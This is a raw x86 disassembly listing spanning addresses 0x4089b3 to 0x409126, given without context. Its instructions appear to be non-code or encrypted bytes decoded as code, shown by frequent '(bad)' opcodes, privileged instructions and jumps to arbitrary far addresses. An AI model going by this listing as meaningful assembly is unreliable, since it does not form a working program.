  4089b3:	sbb    eax,0xa7b0408f
  4089b8:	jmp    0x40895b
  4089ba:	pop    DWORD PTR es:[ebp-0x6]
  4089be:	xchg   ebp,eax
  4089bf:	out    dx,al
  4089c0:	cmc    
  4089c1:	pusha  
  4089c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089c3:	sub    BYTE PTR [edi-0x74],ch
  4089c6:	sub    al,0x11
  4089c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089c9:	xchg   esp,eax
  4089ca:	mov    ds:0x975dc635,eax
  4089cf:	jmp    0x81e7:0x5acdfe30
  4089d6:	test   BYTE PTR [esi],cl
  4089d8:	sub    BYTE PTR [ecx+0x19d83b09],0x84
  4089df:	(bad)  
  4089e1:	sbb    al,0xc2
  4089e3:	push   edx
  4089e4:	ja     0x408a04
  4089e6:	fs dec ebx
  4089e8:	es pop es
  4089ea:	ret    0x15d1
  4089ed:	test   ch,ch
  4089ef:	ret    
  4089f0:	xchg   ecx,eax
  4089f1:	int    0x79
  4089f3:	loop   0x4089a7
  4089f5:	ror    DWORD PTR [edi-0x3e],0xe7
  4089f9:	inc    eax
  4089fa:	outs   dx,DWORD PTR ds:[esi]
  4089fb:	inc    ecx
  4089fc:	sub    al,0xa1
  4089fe:	cwde   
  4089ff:	lods   eax,DWORD PTR ds:[esi]
  408a00:	scas   al,BYTE PTR es:[edi]
  408a01:	popf   
  408a02:	lods   al,BYTE PTR ds:[esi]
  408a03:	jbe    0x408a1d
  408a05:	xor    ebp,DWORD PTR [eax-0x1]
  408a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a09:	gs es cmp eax,0x5bc0bf6c
  408a10:	mov    eax,ds:0x8027a4d0
  408a15:	fild   WORD PTR [ecx]
  408a17:	iret   
  408a18:	loop   0x408a5d
  408a1a:	scas   al,BYTE PTR es:[edi]
  408a1b:	icebp  
  408a1c:	xor    ch,BYTE PTR ds:0xbb89d2a1
  408a22:	inc    edx
  408a23:	or     BYTE PTR [edi+0x7d741bfa],cl
  408a29:	test   BYTE PTR [ebx+0x5e],cl
  408a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a2d:	int    0x5f
  408a2f:	call   0xa510:0x6ee3a5ec
  408a36:	std    
  408a37:	mov    bl,BYTE PTR [ebp+0x5c3b2a31]
  408a3d:	push   ds
  408a3e:	call   0xbbfc:0xead9febc
  408a45:	loopne 0x408ab3
  408a47:	jo     0x408ac5
  408a49:	jmp    0xdf1d9918
  408a4e:	dec    ebx
  408a4f:	lds    eax,FWORD PTR [esp+ecx*2]
  408a52:	loope  0x408aa9
  408a54:	jnp    0x408a20
  408a56:	dec    esp
  408a57:	push   esp
  408a58:	or     eax,0x6d13919c
  408a5e:	add    BYTE PTR [eax],al
  408a60:	mov    eax,DWORD PTR [ecx]
  408a62:	shl    DWORD PTR [edx-0x2e],0x91
  408a66:	pop    esi
  408a67:	daa    
  408a68:	xchg   ecx,ebp
  408a6a:	loopne 0x408a3d
  408a6c:	retf   0xcde0
  408a6f:	xor    al,0x1c
  408a71:	push   ds
  408a72:	shl    BYTE PTR [esi],1
  408a74:	rcl    DWORD PTR [esi],cl
  408a76:	(bad)  
  408a77:	push   eax
  408a78:	fnstcw WORD PTR [edx]
  408a7a:	(bad)  
  408a7b:	mov    cl,0xe8
  408a7d:	cld    
  408a7e:	jns    0x408a44
  408a80:	mov    esp,0xdff353d8
  408a85:	mov    dh,BYTE PTR [ebx-0x291e5e05]
  408a8b:	popf   
  408a8c:	xor    BYTE PTR [edx],cl
  408a8e:	adc    bh,BYTE PTR [ebx+0x39bd4938]
  408a94:	jae    0x408a74
  408a96:	inc    ecx
  408a97:	xchg   ebx,eax
  408a98:	dec    esp
  408a99:	test   DWORD PTR [edi],edi
  408a9b:	or     ah,BYTE PTR [esp+ebx*8+0x7b]
  408a9f:	mov    cl,0xc7
  408aa1:	cmp    dh,BYTE PTR [edx+0x6d]
  408aa4:	and    eax,0xc490f8ec
  408aa9:	popa   
  408aaa:	push   ebp
  408aab:	sub    bh,BYTE PTR [edx-0xad55531]
  408ab1:	mov    bh,0x1c
  408ab3:	dec    ebx
  408ab4:	push   ss
  408ab5:	push   edi
  408ab6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ab7:	xor    edx,DWORD PTR [esi+ebx*4+0x1fa4109d]
  408abe:	lods   eax,DWORD PTR ds:[esi]
  408abf:	mov    ebp,0xda441a29
  408ac4:	cli    
  408ac5:	rcr    edx,0x9f
  408ac8:	mov    BYTE PTR [edi+0x1c2a53ea],al
  408ace:	mov    edi,0x34b09fc
  408ad3:	cld    
  408ad4:	jge    0x408ab5
  408ad6:	mov    eax,0xd667846e
  408adb:	xor    BYTE PTR [ebx+0x5d7ac17d],ch
  408ae1:	dec    ecx
  408ae2:	dec    esi
  408ae3:	enter  0xb5cb,0x92
  408ae7:	cmp    al,0x17
  408ae9:	clc    
  408aea:	dec    edx
  408aeb:	dec    edx
  408aec:	arpl   cx,di
  408aee:	iret   
  408aef:	push   ecx
  408af0:	or     eax,0x2ffd1ece
  408af5:	retf   
  408af6:	jge    0x408ab0
  408af8:	push   es
  408af9:	jae    0x408ab8
  408afb:	and    al,0x46
  408afd:	xor    edi,DWORD PTR [esi]
  408aff:	sbb    esi,ebp
  408b01:	cmp    DWORD PTR [edx+0xa4bc046],esp
  408b07:	adc    ah,BYTE PTR [edi-0x15]
  408b0a:	pop    eax
  408b0b:	loop   0x408a9a
  408b0d:	add    eax,0xa1cc70ae
  408b12:	pop    ds
  408b13:	out    dx,al
  408b14:	(bad)  
  408b15:	out    dx,al
  408b16:	popf   
  408b17:	sbb    dl,dh
  408b19:	add    dl,bl
  408b1b:	test   eax,0xa46b185f
  408b20:	xchg   edx,eax
  408b21:	jae    0x408b0c
  408b23:	xchg   ebx,eax
  408b24:	xlat   BYTE PTR ds:[ebx]
  408b25:	rol    DWORD PTR [edi+edx*1],cl
  408b28:	(bad)  
  408b29:	mov    ebx,ebp
  408b2b:	sub    DWORD PTR [edi-0x598d1749],eax
  408b31:	push   cs
  408b32:	push   ebp
  408b33:	stos   DWORD PTR es:[edi],eax
  408b34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b35:	js     0x408b88
  408b37:	and    eax,0x93e5d9df
  408b3c:	xor    al,0xe7
  408b3e:	adc    ebx,DWORD PTR ds:0x65bc6fe8
  408b44:	mov    dl,0xc4
  408b46:	adc    eax,0x84bf112b
  408b4b:	jno    0x408b15
  408b4d:	jbe    0x408bb5
  408b4f:	xor    dh,BYTE PTR [edi-0x5a]
  408b52:	or     al,0xbe
  408b54:	or     eax,0xe900b649
  408b59:	push   0xffffffe7
  408b5b:	adc    bh,BYTE PTR [ebx-0x2887c2e7]
  408b61:	sub    eax,DWORD PTR [ebp+0x32]
  408b64:	ins    DWORD PTR es:[edi],dx
  408b65:	mov    bl,BYTE PTR [edx+ecx*4+0x76]
  408b69:	xor    eax,0xceb41842
  408b6e:	cwde   
  408b6f:	stc    
  408b70:	mov    ah,0x87
  408b72:	dec    edx
  408b73:	sbb    ah,bl
  408b75:	ss inc edx
  408b77:	push   eax
  408b78:	add    cl,BYTE PTR [eax]
  408b7a:	mov    ecx,0x3ae68b8b
  408b7f:	popa   
  408b80:	aaa    
  408b81:	push   ebx
  408b82:	jp     0x408b61
  408b84:	fld    TBYTE PTR [esi+0x77]
  408b87:	pop    esp
  408b88:	push   ebp
  408b89:	xchg   esi,eax
  408b8a:	xchg   edi,eax
  408b8b:	mov    eax,ds:0x590e58da
  408b90:	xor    al,0x4a
  408b92:	cli    
  408b93:	pop    ebx
  408b94:	int    0x48
  408b96:	cdq    
  408b97:	repnz pop edi
  408b99:	repz (bad) 
  408b9b:	scas   eax,DWORD PTR es:[edi]
  408b9c:	test   al,0xbb
  408b9e:	fwait
  408b9f:	sti    
  408ba0:	sub    dh,0xd
  408ba3:	inc    ebx
  408ba4:	mov    dh,0x63
  408ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ba7:	not    ch
  408ba9:	xchg   edx,eax
  408baa:	cmp    eax,0x6c2d4d66
  408baf:	cmp    al,BYTE PTR [ebp+ebx*2-0x4f]
  408bb3:	hlt    
  408bb4:	cwde   
  408bb5:	stc    
  408bb6:	jns    0x408c37
  408bb8:	adc    DWORD PTR ds:0x72aa273f,esi
  408bbe:	js     0x408bd6
  408bc0:	xchg   bl,cl
  408bc2:	sub    eax,0x16bc8e16
  408bc7:	les    edx,FWORD PTR [eax+0x4f]
  408bca:	clc    
  408bcb:	lods   eax,DWORD PTR ds:[esi]
  408bcc:	(bad)  
  408bcd:	mov    al,0xee
  408bcf:	xchg   edx,eax
  408bd0:	xor    ebp,ecx
  408bd2:	push   ecx
  408bd3:	std    
  408bd4:	popa   
  408bd5:	cmp    BYTE PTR [edx+eax*4+0x464d4257],0x36
  408bdd:	xchg   DWORD PTR [edx],edx
  408bdf:	pop    es
  408be0:	sub    esp,DWORD PTR [edi-0x432b4228]
  408be6:	sub    eax,0x7fc6befb
  408beb:	xchg   edx,eax
  408bec:	jnp    0x408bdd
  408bee:	shr    BYTE PTR [edx+0x35],cl
  408bf1:	imul   ebp,DWORD PTR [ebx-0x38f8716c],0x6b3d0ad3
  408bfb:	push   ecx
  408bfc:	sub    al,0xe6
  408bfe:	out    dx,eax
  408bff:	mov    esi,0xd50ba46
  408c04:	xchg   DWORD PTR [edi],ebx
  408c06:	pop    eax
  408c07:	test   al,0xf4
  408c09:	push   ebp
  408c0a:	sub    edx,DWORD PTR [eax+0x2c736dc3]
  408c10:	cld    
  408c11:	inc    esi
  408c12:	sysexit 
  408c14:	mov    WORD PTR [esi-0x27],?
  408c17:	cmp    DWORD PTR [ecx+0x76f2a64],0xffffffc4
  408c1e:	push   es
  408c1f:	pusha  
  408c20:	ja     0x408bbb
  408c22:	(bad)  
  408c24:	mov    esi,0x1a473c23
  408c29:	xchg   edi,eax
  408c2a:	jle    0x408c9d
  408c2c:	or     eax,0x22a5ed3e
  408c31:	iret   
  408c32:	je     0x408c3f
  408c34:	mov    ch,0xc3
  408c36:	mov    al,ds:0xacc1faf8
  408c3b:	inc    esi
  408c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c3d:	iret   
  408c3e:	sub    ecx,esp
  408c40:	push   es
  408c41:	jl     0x408c1b
  408c43:	mov    bl,0x72
  408c45:	fs add bh,ch
  408c48:	sbb    DWORD PTR [edi],0x23c69dc5
  408c4e:	ss das 
  408c50:	rcr    BYTE PTR [esp+ecx*8+0x0],cl
  408c54:	jecxz  0x408cb2
  408c56:	and    BYTE PTR [edx+0x63dedb60],ah
  408c5c:	ret    
  408c5d:	mov    ebx,0xe7e186f2
  408c62:	xchg   ebp,eax
  408c63:	push   edi
  408c64:	fisub  DWORD PTR [esi]
  408c66:	repz sbb al,0xc3
  408c69:	(bad)  
  408c6a:	stos   DWORD PTR es:[edi],eax
  408c6b:	adc    eax,0xfb2a4c5b
  408c70:	push   ebp
  408c71:	loope  0x408c7d
  408c73:	mov    ds:0xbdbefc1d,al
  408c78:	fisttp WORD PTR [edx+edi*1+0x48]
  408c7c:	cmc    
  408c7d:	mov    ds:0x4c2d8ece,al
  408c82:	into   
  408c83:	dec    ebx
  408c84:	pusha  
  408c85:	icebp  
  408c86:	imul   ebp,DWORD PTR [ecx-0x8],0xf697c68a
  408c8d:	inc    esp
  408c8e:	dec    esi
  408c8f:	jg     0x408c55
  408c91:	js     0x408cec
  408c93:	test   BYTE PTR [edx-0x68],ah
  408c96:	dec    ecx
  408c97:	test   ah,ah
  408c99:	mov    eax,0x4aa36c49
  408c9e:	cmp    cl,BYTE PTR [esi+ecx*2-0x31]
  408ca2:	into   
  408ca3:	sti    
  408ca4:	cmp    eax,0x692eb75b
  408ca9:	jecxz  0x408c6d
  408cab:	mov    ds:0x7d5e07f2,eax
  408cb0:	leave  
  408cb1:	push   edx
  408cb2:	ins    BYTE PTR es:[edi],dx
  408cb3:	jns    0x408c9e
  408cb5:	mov    ah,0x8d
  408cb7:	aas    
  408cb8:	test   eax,0xea0be487
  408cbd:	icebp  
  408cbe:	add    eax,DWORD PTR [ebx+0x3b]
  408cc1:	fbld   TBYTE PTR [ebx+0x7]
  408cc4:	inc    ebx
  408cc5:	cmp    al,0xe6
  408cc7:	(bad)  
  408cc8:	arpl   WORD PTR [esp+0x4797b6a],sp
  408ccf:	pop    ecx
  408cd0:	xchg   esp,eax
  408cd1:	cmp    DWORD PTR [edx+0x6b],ebx
  408cd4:	scas   eax,DWORD PTR es:[edi]
  408cd5:	stos   DWORD PTR es:[edi],eax
  408cd6:	fbstp  TBYTE PTR [eax]
  408cd8:	inc    ecx
  408cd9:	and    eax,0xf1e99f7d
  408cde:	add    DWORD PTR [esp+ecx*1+0x869212e],esi
  408ce5:	aad    0xeb
  408ce7:	mov    edx,0xc0f93861
  408cec:	xchg   BYTE PTR ss:[edx+eax*4-0x49],cl
  408cf1:	push   ecx
  408cf2:	cwde   
  408cf3:	cmp    ah,0x9a
  408cf6:	test   al,dh
  408cf8:	dec    edi
  408cf9:	in     al,dx
  408cfa:	inc    ebx
  408cfb:	mov    bl,0x90
  408cfd:	cmp    BYTE PTR [edi+0x57],al
  408d00:	dec    ebx
  408d01:	into   
  408d02:	ret    
  408d03:	aaa    
  408d04:	outs   dx,BYTE PTR ds:[esi]
  408d05:	imul   DWORD PTR ds:0xca5bca56
  408d0b:	int    0x83
  408d0d:	jbe    0x408d50
  408d0f:	adc    cl,BYTE PTR ss:[edx-0x3]
  408d13:	sub    eax,0x70abd42e
  408d18:	xchg   ecx,eax
  408d19:	sub    dh,BYTE PTR [ecx+0x2e]
  408d1c:	(bad)  
  408d1d:	pushf  
  408d1e:	add    ecx,DWORD PTR [eax+ebp*4+0x77eac49b]
  408d25:	(bad)  
  408d26:	mov    ds:0x4c341d9f,al
  408d2b:	into   
  408d2c:	jl     0x408d5c
  408d2e:	int3   
  408d2f:	(bad)  
  408d30:	mov    dl,0xeb
  408d32:	shr    DWORD PTR [ebx],cl
  408d34:	and    ebp,DWORD PTR [eax]
  408d36:	xchg   ebx,eax
  408d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d38:	pop    eax
  408d39:	pop    esi
  408d3a:	push   es
  408d3b:	cmp    eax,0x7e3d0021
  408d40:	adc    DWORD PTR [esi+ebx*1+0x52],esi
  408d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d45:	es cmc 
  408d47:	not    ch
  408d49:	icebp  
  408d4a:	xchg   edi,eax
  408d4b:	mov    cl,0x6f
  408d4d:	mov    eax,ds:0x643bee4b
  408d52:	stos   DWORD PTR es:[edi],eax
  408d53:	cmp    dh,BYTE PTR [esi-0x21f00e0b]
  408d59:	xor    eax,0x6709a53a
  408d5e:	into   
  408d5f:	not    BYTE PTR [ebx+0x263afc17]
  408d65:	mov    edi,0xe5221107
  408d6a:	fwait
  408d6b:	cmc    
  408d6c:	mov    ch,0x4
  408d6e:	add    eax,0xbaa543b5
  408d73:	loopne 0x408df1
  408d75:	imul   edx,ebp,0x390e22c7
  408d7b:	ret    
  408d7c:	(bad)  
  408d7e:	push   eax
  408d7f:	pop    eax
  408d80:	xchg   ecx,eax
  408d81:	xchg   edx,eax
  408d82:	mov    eax,DWORD PTR [eax+0x57f53bfe]
  408d88:	or     al,BYTE PTR [eax]
  408d8a:	(bad)  
  408d8b:	shl    BYTE PTR [edi],1
  408d8d:	adc    cl,bh
  408d8f:	push   esi
  408d90:	inc    ebp
  408d91:	daa    
  408d92:	loopne 0x408dd1
  408d94:	xor    DWORD PTR [ecx],0xffffffc0
  408d97:	arpl   WORD PTR [ebx+0x488e9e6c],cx
  408d9d:	xchg   esi,eax
  408d9e:	dec    ebx
  408d9f:	jle    0x408dc2
  408da1:	cmp    esi,esp
  408da3:	xchg   edx,eax
  408da4:	jge    0x408d3d
  408da6:	cmp    eax,0x8838b632
  408dab:	mov    esi,DWORD PTR [eax+0x124f6266]
  408db1:	addr16 jmp 0x408e12
  408db4:	and    ebp,DWORD PTR [eax+0x76]
  408db7:	iret   
  408db8:	loopne 0x408d88
  408dba:	fwait
  408dbb:	js     0x408dd9
  408dbd:	mov    WORD PTR [ebp+0x33ba68ec],es
  408dc3:	and    BYTE PTR [ebx],ah
  408dc5:	cmp    eax,0x3c1d2e4c
  408dca:	dec    esi
  408dcb:	dec    ecx
  408dcc:	sbb    esi,DWORD PTR ds:0xc5bbff21
  408dd2:	sbb    esp,DWORD PTR [edx+edi*4]
  408dd5:	in     eax,dx
  408dd6:	jo     0x408de0
  408dd8:	xchg   ecx,eax
  408dd9:	mov    ch,0x65
  408ddb:	dec    esp
  408ddc:	dec    ecx
  408ddd:	and    ecx,eax
  408ddf:	ins    BYTE PTR es:[edi],dx
  408de0:	rol    dl,1
  408de2:	xor    ah,BYTE PTR [ebp+0x7e]
  408de5:	and    al,0xbc
  408de7:	dec    edi
  408de8:	sbb    ah,BYTE PTR [esi]
  408dea:	and    eax,0x4ead2366
  408def:	dec    esp
  408df0:	outs   dx,BYTE PTR ds:[esi]
  408df1:	fild   QWORD PTR [edi-0x1aedc6b7]
  408df7:	(bad)  
  408df8:	jp     0x408db8
  408dfa:	inc    edi
  408dfb:	js     0x408e0f
  408dfd:	mov    esi,0xb7492dda
  408e02:	pop    esi
  408e03:	std    
  408e04:	fisttp QWORD PTR [ebx-0x4b]
  408e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e08:	push   ecx
  408e09:	add    edx,ebx
  408e0b:	jo     0x408e64
  408e0d:	jmp    0x408e43
  408e0f:	shr    BYTE PTR [ebx],0x29
  408e12:	arpl   bp,bp
  408e14:	ret    0xcdc8
  408e17:	add    DWORD PTR [ecx],ecx
  408e19:	imul   esi,DWORD PTR [ecx-0x43],0xd0f02039
  408e20:	dec    ebx
  408e21:	mov    WORD PTR [esi-0xb],?
  408e24:	(bad)  
  408e25:	hlt    
  408e26:	xor    ebp,DWORD PTR [edx-0x61]
  408e29:	(bad)  
  408e2a:	sub    BYTE PTR [esi-0x463b14d],bh
  408e30:	rcr    BYTE PTR [ecx],0xab
  408e33:	js     0x408e71
  408e35:	(bad)  
  408e36:	or     eax,DWORD PTR [eax-0x3d66fcfd]
  408e3c:	xlat   BYTE PTR ds:[ebx]
  408e3d:	or     al,0x52
  408e3f:	and    al,0x67
  408e41:	add    BYTE PTR [ebp-0x54],dl
  408e44:	loopne 0x408ddc
  408e46:	pop    esp
  408e47:	jp     0x408e81
  408e49:	sar    BYTE PTR [eax],1
  408e4b:	in     eax,dx
  408e4c:	fnstenv ds:0xbbadddfa
  408e52:	xor    BYTE PTR [ecx],dl
  408e54:	(bad)  
  408e55:	out    dx,eax
  408e56:	push   0x62d82d84
  408e5b:	push   ss
  408e5c:	mov    cl,0x1b
  408e5e:	ds mov al,0xf0
  408e61:	rcl    BYTE PTR [eax],cl
  408e63:	popa   
  408e64:	xchg   esi,eax
  408e65:	xlat   BYTE PTR ds:[ebx]
  408e66:	sbb    BYTE PTR [esi+0x73edbb73],ah
  408e6c:	dec    BYTE PTR ds:0xee59fecd
  408e72:	cmc    
  408e73:	je     0x408e6f
  408e75:	push   eax
  408e76:	mov    edi,DWORD PTR [ecx-0x73]
  408e79:	arpl   ax,dx
  408e7b:	jnp    0x408ee5
  408e7d:	rol    DWORD PTR [ecx+esi*2],cl
  408e80:	inc    ebp
  408e81:	pop    eax
  408e82:	imul   eax,DWORD PTR [edi+eax*1-0x3b68d402],0x51
  408e8a:	dec    edx
  408e8b:	int    0x80
  408e8d:	mov    al,ds:0xd165b718
  408e92:	adc    al,0x8f
  408e94:	clc    
  408e95:	dec    ebp
  408e96:	adc    eax,0x5bec6a34
  408e9b:	jo     0x408eec
  408e9d:	test   esi,esp
  408e9f:	push   ss
  408ea0:	xor    esp,DWORD PTR [edi+eiz*2-0x5c1f9065]
  408ea7:	fiadd  WORD PTR [edx]
  408ea9:	fwait
  408eaa:	mov    edi,0x5e770058
  408eaf:	ds sbb eax,0x79de5258
  408eb5:	loop   0x408ea8
  408eb7:	add    eax,0x3b97cacc
  408ebc:	pop    esp
  408ebd:	jg     0x408ee7
  408ebf:	mov    ebp,0xb5a934e3
  408ec4:	xor    esp,eax
  408ec6:	or     BYTE PTR [edi],bh
  408ec8:	ret    
  408ec9:	cmp    BYTE PTR [edi-0x4f1d9d96],bl
  408ecf:	or     BYTE PTR [esi+0xb1c6dd0],ch
  408ed5:	dec    ecx
  408ed6:	retf   0xf621
  408ed9:	lea    esp,[ebx]
  408edb:	pop    esp
  408edc:	aaa    
  408edd:	pop    ebx
  408edf:	lods   eax,DWORD PTR ds:[esi]
  408ee0:	loopne 0x408ee8
  408ee2:	leave  
  408ee3:	in     al,dx
  408ee4:	xlat   BYTE PTR ds:[ebx]
  408ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ee6:	push   ecx
  408ee7:	nop
  408ee8:	inc    esi
  408ee9:	mov    bh,BYTE PTR [ebx-0x5]
  408eec:	sub    esp,edi
  408eee:	sub    bh,bh
  408ef0:	clc    
  408ef1:	or     esp,edx
  408ef3:	(bad)  
  408ef5:	(bad)  
  408ef6:	push   ecx
  408ef7:	out    0x4b,eax
  408ef9:	xchg   edx,eax
  408efa:	sbb    ah,bl
  408efc:	mov    al,ds:0xc12663c0
  408f01:	test   eax,0x90e293bb
  408f06:	inc    ebp
  408f07:	and    cl,bh
  408f09:	sar    BYTE PTR [ecx+edx*4],cl
  408f0c:	push   ecx
  408f0d:	jns    0x408e9e
  408f0f:	mov    WORD PTR [ecx-0x1593bd6c],?
  408f15:	les    edx,FWORD PTR [ecx+eiz*1-0x7efa4576]
  408f1c:	cmp    al,0x84
  408f1e:	push   edi
  408f1f:	jge    0x408f9d
  408f21:	mov    ds:0xed83fed2,al
  408f26:	(bad)  
  408f27:	fld    DWORD PTR [ebx+0x492ca0ab]
  408f2d:	retf   
  408f2e:	ror    BYTE PTR [ecx],0x28
  408f31:	sub    eax,0x4749a4d0
  408f36:	fwait
  408f37:	sub    al,0xf0
  408f39:	jns    0x408f14
  408f3b:	add    eax,0xe94aba9f
  408f40:	dec    edx
  408f41:	popa   
  408f42:	xchg   esi,eax
  408f43:	xor    ebx,edi
  408f45:	and    esi,ebp
  408f47:	cli    
  408f48:	mov    ch,0x92
  408f4a:	arpl   WORD PTR [edx-0x33140218],cx
  408f50:	pop    esi
  408f51:	out    0xaf,eax
  408f53:	inc    esi
  408f54:	and    BYTE PTR [eax-0x65],dl
  408f57:	sub    esp,DWORD PTR [ecx]
  408f59:	cmp    cl,BYTE PTR [edi-0x55]
  408f5c:	shr    BYTE PTR [eax-0x72b39fbb],cl
  408f62:	mov    al,ds:0xc4a12d79
  408f67:	test   BYTE PTR [ecx-0x2f47f5f0],dh
  408f6d:	jmp    0x408f98
  408f6f:	aad    0x32
  408f71:	hlt    
  408f72:	add    DWORD PTR [esi],edi
  408f74:	and    ebx,DWORD PTR ds:0x849b55fb
  408f7a:	jecxz  0x408f2d
  408f7c:	push   0xffffff8c
  408f7e:	push   esi
  408f7f:	inc    esp
  408f80:	mov    ds:0xbad53797,al
  408f85:	adc    al,0x46
  408f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f88:	mov    ebx,0xab183d13
  408f8d:	cmp    al,0x76
  408f8f:	arpl   WORD PTR ds:0x72f24953,si
  408f95:	jne    0x408f49
  408f97:	and    bh,al
  408f99:	lds    ebx,FWORD PTR [ebx-0x46ca883]
  408f9f:	mov    edx,ebx
  408fa1:	jbe    0x408fa7
  408fa3:	add    dl,BYTE PTR [edi]
  408fa5:	pop    edx
  408fa6:	ins    DWORD PTR es:[edi],dx
  408fa7:	imul   ebx,DWORD PTR [ebp+0x2c],0xfffffff4
  408fab:	xor    BYTE PTR [ebp-0x5c],ah
  408fae:	jbe    0x408ffb
  408fb0:	retf   
  408fb1:	clc    
  408fb2:	ss fcmovnb st,st(0)
  408fb5:	xchg   ecx,eax
  408fb6:	jns    0x408fa1
  408fb8:	xor    eax,0xcfcd927d
  408fbd:	cld    
  408fbe:	ret    
  408fbf:	shl    DWORD PTR [edx],1
  408fc1:	sub    al,0xc3
  408fc3:	jae    0x408fe3
  408fc5:	and    esp,0x2b9efc7d
  408fcb:	xchg   ch,bl
  408fcd:	pcmpgtb mm6,QWORD PTR [edx]
  408fd0:	mov    edx,0xed7996ff
  408fd5:	add    ebx,DWORD PTR [ebp-0x2]
  408fd8:	jecxz  0x408fe6
  408fda:	(bad)  
  408fdb:	jl     0x40904e
  408fdd:	cmp    BYTE PTR [ebp+ecx*2-0x66],dl
  408fe1:	scas   eax,DWORD PTR es:[edi]
  408fe2:	add    al,BYTE PTR [ebx+eiz*4+0x6882e9b3]
  408fe9:	outs   dx,BYTE PTR ds:[esi]
  408fea:	jbe    0x408fe0
  408fec:	jno    0x408f87
  408fee:	xchg   al,bl
  408ff0:	sar    DWORD PTR [edi+0x28],cl
  408ff3:	push   es
  408ff4:	sahf   
  408ff5:	sub    esi,DWORD PTR [edx-0x284efef0]
  408ffb:	or     BYTE PTR [esi+0x6bbd8be0],al
  409001:	cmp    al,0x63
  409003:	xchg   edi,eax
  409004:	mov    dl,0xc8
  409006:	dec    esi
  409007:	scas   al,BYTE PTR es:[edi]
  409008:	inc    edi
  409009:	sub    al,0xdc
  40900b:	into   
  40900c:	test   BYTE PTR [edi+ecx*4],bl
  40900f:	dec    ecx
  409010:	out    dx,al
  409011:	daa    
  409012:	push   cs
  409013:	cld    
  409014:	add    ebp,DWORD PTR [esi+0x7ec3c351]
  40901a:	sbb    cl,al
  40901c:	or     esi,edx
  40901e:	mov    edx,0x788f82ae
  409023:	add    al,0xb2
  409025:	gs test dh,bh
  409028:	lods   eax,DWORD PTR ds:[si]
  40902a:	jbe    0x408fe9
  40902c:	mov    esi,DWORD PTR [ecx+0x11]
  40902f:	pop    edi
  409030:	push   ebx
  409031:	fidiv  DWORD PTR [eax]
  409033:	scas   eax,DWORD PTR es:[edi]
  409034:	cmp    eax,DWORD PTR [edi+0x2ff82859]
  40903a:	(bad)
  40903e:	sub    ebp,DWORD PTR [eax-0x3aec7cda]
  409044:	out    0xfa,al
  409046:	mul    BYTE PTR [ecx+0x0]
  409049:	inc    ebp
  40904a:	lods   al,BYTE PTR ds:[esi]
  40904b:	pop    es
  40904c:	stos   BYTE PTR es:[edi],al
  40904d:	fstp   TBYTE PTR [ebp+0x79afb968]
  409053:	cmp    BYTE PTR [esi],cl
  409055:	xchg   edx,eax
  409056:	adc    DWORD PTR [eax+0x72066a67],eax
  40905c:	mov    ds:0xf619c489,eax
  409061:	(bad)  [ecx-0x6b]
  409064:	sbb    eax,0xe2007422
  409069:	jae    0x408ff7
  40906b:	aas    
  40906c:	in     al,0x5d
  40906e:	jge    0x408ffb
  409070:	test   al,0x4d
  409072:	cli    
  409073:	cwde   
  409074:	fnstsw WORD PTR [ebx+0x1]
  409077:	adc    al,0x28
  409079:	dec    ebp
  40907a:	out    dx,eax
  40907b:	mov    ds:0x24439ab,al
  409080:	(bad)  
  409082:	mov    ecx,0xfc244c1e
  409087:	inc    edx
  409088:	out    0xec,eax
  40908a:	call   0x2a561534
  40908f:	lea    ebp,[eax+0x5e]
  409092:	mov    ds:0x170571af,eax
  409097:	sahf   
  409098:	adc    al,0x4d
  40909a:	dec    edx
  40909b:	push   0xffffffc0
  40909d:	jmp    0x409080
  40909f:	push   edx
  4090a0:	daa    
  4090a1:	test   DWORD PTR [edx-0xcc93f8e],edx
  4090a7:	mov    esp,0x578d2017
  4090ac:	gs jb  0x4090ca
  4090af:	loope  0x409043
  4090b1:	or     bh,dl
  4090b3:	enter  0x72a1,0x41
  4090b7:	mov    bl,0x55
  4090b9:	nop
  4090ba:	in     al,0x1e
  4090bc:	or     al,0x71
  4090be:	je     0x409110
  4090c0:	jae    0x409085
  4090c2:	jl     0x409129
  4090c4:	dec    ebp
  4090c5:	jae    0x40913d
  4090c7:	dec    esp
  4090c8:	mov    cl,0x8e
  4090ca:	out    0xfe,al
  4090cc:	int3   
  4090cd:	das    
  4090ce:	pusha  
  4090cf:	cmp    DWORD PTR ds:0x38a3af9d,edi
  4090d5:	(bad)  
  4090d6:	cmp    DWORD PTR [edi+edx*4-0x308c2e92],eax
  4090dd:	pop    ebp
  4090de:	or     al,0x45
  4090e0:	fwait
  4090e1:	and    ebx,DWORD PTR [edx+0x19]
  4090e4:	inc    ebx
  4090e5:	push   esi
  4090e6:	adc    dl,BYTE PTR [ecx-0x7c]
  4090e9:	or     al,0x96
  4090eb:	fstp   st(7)
  4090ed:	pop    ecx
  4090ee:	sub    al,0xaf
  4090f0:	cmp    al,0xa3
  4090f2:	int3   
  4090f3:	out    dx,eax
  4090f4:	xchg   ecx,eax
  4090f5:	xor    BYTE PTR [esi-0x79859634],dl
  4090fb:	sbb    eax,0x3ae24a8
  409100:	mov    ah,0x40
  409102:	test   al,bl
  409104:	clc    
  409105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409106:	in     eax,0x4f
  409108:	cmp    al,0xd4
  40910a:	hlt    
  40910b:	jge    0x4090b1
  40910d:	(bad)  
  40910e:	cld    
  40910f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409110:	mov    ebp,DWORD PTR [ebx+0x6be67cf1]
  409116:	arpl   WORD PTR [esi+0x16667a15],bx
  40911c:	push   0xfd6bfd72
  409121:	jecxz  0x409197
  409123:	rcr    DWORD PTR [eax-0x26],1
  409126:	push   edi
